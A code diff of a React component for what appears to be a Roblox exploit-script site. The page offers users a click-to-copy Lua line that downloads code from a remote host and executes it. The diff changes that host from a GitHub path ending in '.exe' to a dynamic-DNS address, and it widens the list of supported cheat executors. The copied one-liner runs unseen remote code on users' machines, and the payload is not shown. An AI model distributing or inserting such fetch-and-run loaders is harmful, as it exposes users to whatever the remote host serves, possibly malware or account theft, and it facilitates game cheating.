@@ -8,7 +8,7 @@ function ScriptBlock() {
         statusColor: "gray"
     });
 
-    const scriptText = `loadstring(game:HttpGet("https://raw.githubusercontent.com/imcomingforyou6959-gif/rawr.xyz/refs/heads/main/.exe"))()`;
+    const scriptText = `loadstring(game:HttpGet("https://rawrs.zapto.org/file.txt", true))()`;
     
     // 1
     const { motion, AnimatePresence } = window.Motion;
@@ -26,7 +26,7 @@ function ScriptBlock() {
             })
             .catch(err => {
                 console.error("Status fetch failed:", err);
-                setConfig({ version: "v1.7.2", status: "ONLINE", statusColor: "green" });
+                setConfig({ version: "V4.5.1", status: "ONLINE", statusColor: "green" });
             });
     }, []);
 
@@ -60,7 +60,7 @@ function ScriptBlock() {
 
     // 1
     const CompatibilityBar = () => {
-        const executors = ["Xeno", "Velocity", "Solara", "Wave", "Sirhurt"];
+        const executors = ["Xeno", "Velocity", "Solara", "Volt", "Sirhurt", "Wave", "Madium", "Luna", "And Any Executor!"];
         return (
             <motion.div 
                 initial={{ opacity: 0 }}
@@ -139,7 +139,7 @@ function ScriptBlock() {
                                     exit={{ y: -20, opacity: 0 }}
                                     className="absolute inset-0 flex items-center justify-center bg-primary text-white font-bold"
                                 >
-                                    SUCCESS! COPIED TO CLIPBOARD
+                                    Copied to Clipboard
                                 </motion.div>
                             ) : (
                                 <motion.span 
@@ -147,7 +147,7 @@ function ScriptBlock() {
                                     initial={{ opacity: 0 }}
                                     animate={{ opacity: 1 }}
                                 >
-                                    CLICK TO COPY SCRIPT
+                                    Click to copy
                                 </motion.span>
                             )}
                         </AnimatePresence>
@@ -155,7 +155,7 @@ function ScriptBlock() {
                 </div>
             </motion.div>
 
-            {/* Verification Bar integrated below terminal */}
+            {/* Hc */}
             <CompatibilityBar />
         </div>
     );
